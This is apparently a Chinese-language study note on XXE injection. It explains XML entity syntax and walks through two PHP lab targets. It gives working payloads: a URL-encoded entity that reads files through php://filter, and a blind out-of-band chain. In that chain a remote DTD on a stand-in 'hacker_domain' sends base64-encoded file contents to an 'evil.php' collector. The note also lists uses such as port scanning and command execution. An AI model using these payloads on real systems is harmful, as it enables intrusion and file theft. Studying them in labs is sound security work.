---
title: XXE
categories:
- Network_Security
- Web
- XXE
tags:
- Network_Security
date: 2024-01-29 11:27:47
---

# XXE 实体注入

## 1. 使用条件

1. PHP 中 libxml < libxml 2.9.1时，其默认支持解析外部实体。

## 2. xml 格式的说明

1. XML 的结构包括 XML 声明、DTD（文档类型定义）（可选）和文档元素，具体例子如下：

    ```xml-dtd
    <!-- XML 声明 -->
    <?xml version="1.0" ?>
    <!-- XML 声明结束 -->
    <!-- DTD 文档类型定义 -->
    <!DOCTYPE note[
            <!ELEMENT note(to, from)> <!-- 定义 note 元素有 2 个元素 -->
            <!ELEMENT to(#PCDATA)>    <!-- 定义 to 元素为 “#PCDATA” 类型 -->
            <!ELEMENT from(#PCDATA)   <!-- 定义 from 元素为 “#PCDATA” 类型 -->
    ]>
    <!-- DTD 文档类型定义结束 -->
    <!-- 文档元素 -->
    <note>
    <to>aaa</to>
    <from>bbb</from>
    </note>
    ```

## 3. DTD 的声明

1. 内部声明

    `<!DOCTYPE 根元素 [元素声明]>`

2. 引用外部的 DTD

    `<!DOCTYPE 根元素 SYSTEM "URL/URI">`

    `<!DOCTYPE 根元素 PUBLIC "public_ID" "URL/URI">`

## 4. 实体

1. 实体可以理解为变量，其必须在 DTD 中定义和申明，可以在其他的位置中引用并执行它。

### 1. 外部实体引用

1. 和外部 DTD 引用类似（主要是有关键字 `SYSTEM 和 PUBLIC`）：

    `<!ENTITY 实体名称 SYSTEM "URI/URL">`

    `<!ENTITY 实体名称 PUBLIC "public_ID" "URI">`

### 2. 内部实体声明与实体调用

1. 直接在内部中声明即可：

    `<!ENTITY 实体名称 "实体的值">`

2. 例如：

    ```xml-dtd
    ...
    <!ENTITY writer "me">
    ...
    <author>&writer;</author>
    ```

3. 其中，`&` 表示引用，`;` 表示调用结束，这两个之间就是实体名称。

### 3. 实体的类型

#### 1. 字符实体

1. 指用十进制格式(&#aaa;)或十六进制格式(&#xaaa;)来指定任意 Unicode 字符。对 XML 解析器而言，字符实体与直接输入指定字符的效果完全相同。

#### 2. 命名实体

1. 最像变量的一个实体，上面的例子中用的就是命名实体。

2. 例如（外部实体调用）：

    ```xml-dtd
    ...
    <!DOCTYPE a [
            <!ENTITY xxe SYSTEM "URI">
        ]>
    <a>
    <value>&xxe;</value>
    </a>
    ```

#### 3. 参数实体

1. 其作用范围只在 DTD 中。

2. 参数实体的声明和调用都需要以 `% 或者 10/16 进制编码（&#/&#x）后的 %` 为开头。

3. 例如：

    ```xml-dtd
    ...
    <!DOCTYPE ANY [
            <!ENTITY % xxe "URI">
            %second;
        ]>
    ```

## 5. xxe 注入

### 1. 有回显的注入

1. php 靶场的源代码为：

    ```php+HTML
    <?php
    $string_xml = '<?xml version="1.0" encoding="utf-8"?><note><to>George</to><from>John</from><heading>Reminder</heading><body>xml实体注入</body></note>';
    $xml = isset($_POST['xml'])?$_POST['xml']:$string_xml;
    $data = simplexml_load_string($xml);
    echo  '<meta charset="UTF-8">';
    print_r($data);
    ?>
    ```

2. 进入后界面如下：

    ![image-20220517202533002](image-20220517202533002.png)

3. 根据靶场的源代码，可以看出通过 xml 参数，以 POST 方法传递过去并交给方法 `simple_load_string()` 执行。

4. 这里抓包，然后传入 payload，具体 payload 如下（POST 也要进行 URL 编码）：

    ```xml-dtd
    xml=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20%20a%20%20%5B%3C!ENTITY%20b%20SYSTEM%20%22http%3A%2F%2Flocalhost%2Fxxe02.php%22%3E%5D%3E%3Croot%3E%26b%3B%3C%2Froot%3E
    ```

    这里对 payload 进行 url-encode，未编码前的 payload 为（换行符没有编码，这里只是为了方便查看）：

    ```xml-dtd
    xml=
    <?xml version="1.0"?>
    <!DOCTYPE a [
        <!ENTITY b SYSTEM "http://localhost/xxe02.php">
        ]>
    <a>&b;</a>
    ```

    这里调用了实体 b，然后被打印出来。

5. 这里上传成功后，显示的结果为：

    ![image-20220517203246919](image-20220517203246919.png)

6. 同样的，这里也可以用 php 的伪协议：

    `"php://filter/read=convert.base64-encode/resource=xxe02.php"`

### 2. 没有回显的注入

1. 靶场代码：

    ```php+HTML
    <?php
    $xml = isset($_POST['xml'])?$_POST['xml']:"";
    $data = @simplexml_load_string($xml);
    ?>
    ```

2. 由于没有 print，所以没有回显，因此这里的思路就是创建数据通道，将其带出来。

3. 参考 payload 如下：

    payload：

    ```xml-dtd
    xml=
    <?xml version="1.0"?>
    <!DOCTYPE a [
            <!ENTITY % target_file SYSTEM "php://filter/read=convert.base64-encode/resource=URI">
            <!ENTITY % remote_dtd SYSTEM "http://hacker_domain/evil.xml 或者 dtd">
            %remote_dtd;
            %request;
        ]>
    <a>&attack;</a>
    ```

    hacker_domain 下的 evil.xml 文件内容如下：

    ```xml-dtd
    <!ENTITY % request "<!ENTITY attack SYSTEM 'http://hacker_domain/evil.php?target_file=%target_file;'>">
    ```

    evil.php 的内容如下：

    ```php+HTML
    <?php 
        file_put_contents("target_file.txt", $_GET['target_file']);
    ?>
    ```

4. 过程如下：

    payload 中，首先使用参数实体 `remote_dtd`，引入黑客的外部实体。然后引入的外部实体中，又有 `request` 的内部参数实体，接着调用该实体，就会导入 `attack` 的外部命名实体，最后调用该命名实体，在调用期间同时调用了 `target_file` 的外部参数实体，把 `target_file` 的内容传给黑客的服务器上的 `evil.php`，然后该 php 将内容输出到 `target_file.txt` 文件中。

5. 至于为什么若参数实体 `request` 和命名实体 `attack` 直接写在一起，不经过黑客的 DTD，写成：

    ```xml-dtd
    [<!ENTITY % target_file SYSTEM "php://filter/read=convert.base64-encode/resource=xxe02.php">
    <!ENTITY remote_dtd SYSTEM "http://hacker_domain/evil.php?target_file=%target_file;">]
    <a>&remote_dtd;</a>
    ```

    不起作用的原因是因为参数实体不能在DTD子集内调用，但是可以在外部子集中调用。

6. 其他可能的 payload：

    1. 如果第 5 点改成参数实体呢？（也就是不经过黑客的 DTD）

        经过实验，无法成功

    2. 如果没有 request 作为中转而直接调用外部的 DTD 呢？

        经过实验，也无法成功

    3. 暂时不知道无法成功的原因。


## 6. 利用场景

1. 内网探测，访问 http 访问指定端口来判断端口是否开启
2. 文件读取和命令执行：文件读取就看是否支持伪协议，命令执行在 php 的网站中就是是否开启了 `expect` 伪协议。

## 7. 补充

1. 基于报错的 XXE 注入
2. 一些注意事项
3. 详见：https://www.secpulse.com/archives/58915.html

## 8. TODO

1. 如何判断是否有 XXE 漏洞？
2. 其他可能的利用场景

